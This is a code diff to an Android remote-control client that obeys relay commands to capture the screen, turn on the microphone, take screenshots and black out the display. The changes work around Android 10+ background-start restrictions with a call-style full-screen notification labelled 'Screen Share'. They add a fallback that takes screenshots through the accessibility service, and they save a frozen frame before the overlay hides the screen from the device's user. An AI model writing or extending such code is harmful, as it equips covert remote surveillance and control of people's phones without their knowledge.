@@ -56,10 +56,35 @@ public class RelayClient {
             socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "Disconnected from relay"));
 
             socket.on("start_screen", args -> {
-                android.content.Intent i = new android.content.Intent(
-                    service, ScreenCaptureActivity.class);
-                i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-                service.startActivity(i);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    // Android 10+: background activity start is blocked; use a
+                    // full-screen-intent notification as a trampoline instead
+                    android.app.PendingIntent pi = android.app.PendingIntent.getActivity(
+                        service, 0,
+                        new android.content.Intent(service, ScreenCaptureActivity.class)
+                            .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                                      android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP),
+                        android.app.PendingIntent.FLAG_IMMUTABLE |
+                        android.app.PendingIntent.FLAG_UPDATE_CURRENT);
+                    android.app.Notification notif =
+                        new androidx.core.app.NotificationCompat.Builder(service, MonitorService.CHANNEL)
+                            .setSmallIcon(android.R.drawable.ic_dialog_info)
+                            .setContentTitle("Screen Share")
+                            .setContentText("Tap to allow screen sharing")
+                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
+                            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
+                            .setFullScreenIntent(pi, true)
+                            .setAutoCancel(true)
+                            .build();
+                    android.app.NotificationManager nm = (android.app.NotificationManager)
+                        service.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
+                    if (nm != null) nm.notify(99, notif);
+                } else {
+                    android.content.Intent i = new android.content.Intent(
+                        service, ScreenCaptureActivity.class);
+                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                    service.startActivity(i);
+                }
             });
             socket.on("stop_screen", args -> {
                 ScreenService ss = ScreenService.getInstance();
@@ -70,8 +95,19 @@ public class RelayClient {
             socket.on("mic_on",          args -> service.startMic());
             socket.on("mic_off",         args -> service.stopMic());
             socket.on("take_screenshot", args -> {
+                final String req = requester(args);
                 ScreenService ss = ScreenService.getInstance();
-                if (ss != null) ss.takeScreenshot(args, this);
+                if (ss != null) {
+                    ss.takeScreenshot(args, this);
+                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    // ScreenService not active — fall back to AccessibilityService screenshot
+                    InputService inputSvc = InputService.getInstance();
+                    if (inputSvc != null) {
+                        inputSvc.captureScreen(jpeg -> {
+                            if (jpeg != null) emitScreenshot(jpeg, req);
+                        });
+                    }
+                }
             });
 
             socket.on("get_sysinfo", args -> {
@@ -256,20 +292,29 @@ public class RelayClient {
 
             // ── Black screen overlay ──────────────────────────────────────────
             socket.on("screen_dark", args -> {
+                final String req = requester(args);
                 try {
+                    // Grab a frozen frame BEFORE the overlay hides the screen
+                    ScreenService ss = ScreenService.getInstance();
+                    if (ss != null) {
+                        byte[] frozen = ss.captureOneFrame();
+                        if (frozen != null) service.setFrozenFrame(frozen);
+                    }
                     service.getScreenOverlay().showBlackScreen();
                     JSONObject res = new JSONObject();
                     res.put("ok", true);
-                    res.put("_requester", requester(args));
+                    res.put("_requester", req);
                     socket.emit("screen_dark_result", res);
                 } catch (Exception e) { Log.e(TAG, "screen_dark error", e); }
             });
             socket.on("screen_dark_off", args -> {
+                final String req = requester(args);
                 try {
                     service.getScreenOverlay().hideBlackScreen();
+                    service.setFrozenFrame(null);
                     JSONObject res = new JSONObject();
                     res.put("ok", true);
-                    res.put("_requester", requester(args));
+                    res.put("_requester", req);
                     socket.emit("screen_dark_result", res);
                 } catch (Exception e) { Log.e(TAG, "screen_dark_off error", e); }
             });
